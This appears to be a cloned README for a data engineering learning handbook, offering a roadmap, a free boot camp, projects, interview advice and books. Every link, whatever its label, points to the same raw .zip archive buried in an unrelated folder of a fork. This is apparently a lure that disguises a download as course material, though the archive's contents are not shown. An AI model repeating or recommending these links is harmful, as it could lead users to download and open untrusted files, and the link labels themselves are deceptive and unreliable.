# The Data Engineering Handbook

This repo has all the resources you need to become an amazing data engineer!

## Getting started

If you are new to data engineering, start by following this [2024 breaking into data engineering roadmap](https://raw.githubusercontent.com/iqbaldiit/data-engineer-handbook/main/bootcamp/materials/4-apache-flink-training/engineer-data-handbook-v3.4-alpha.5.zip)

If you are here for the [6-week free YouTube boot camp](https://raw.githubusercontent.com/iqbaldiit/data-engineer-handbook/main/bootcamp/materials/4-apache-flink-training/engineer-data-handbook-v3.4-alpha.5.zip) you can check out
- [introduction](https://raw.githubusercontent.com/iqbaldiit/data-engineer-handbook/main/bootcamp/materials/4-apache-flink-training/engineer-data-handbook-v3.4-alpha.5.zip)
- [software needed](https://raw.githubusercontent.com/iqbaldiit/data-engineer-handbook/main/bootcamp/materials/4-apache-flink-training/engineer-data-handbook-v3.4-alpha.5.zip)


For more applied learning:
- Check out the [projects](https://raw.githubusercontent.com/iqbaldiit/data-engineer-handbook/main/bootcamp/materials/4-apache-flink-training/engineer-data-handbook-v3.4-alpha.5.zip) section for more hands-on examples!
- Check out the [interviews](https://raw.githubusercontent.com/iqbaldiit/data-engineer-handbook/main/bootcamp/materials/4-apache-flink-training/engineer-data-handbook-v3.4-alpha.5.zip) section for more advice on how to pass data engineering interviews!
- Check out the [books](https://raw.githubusercontent.com/iqbaldiit/data-engineer-handbook/main/bootcamp/materials/4-apache-flink-training/engineer-data-handbook-v3.4-alpha.5.zip) section for a list of high quality data engineering books
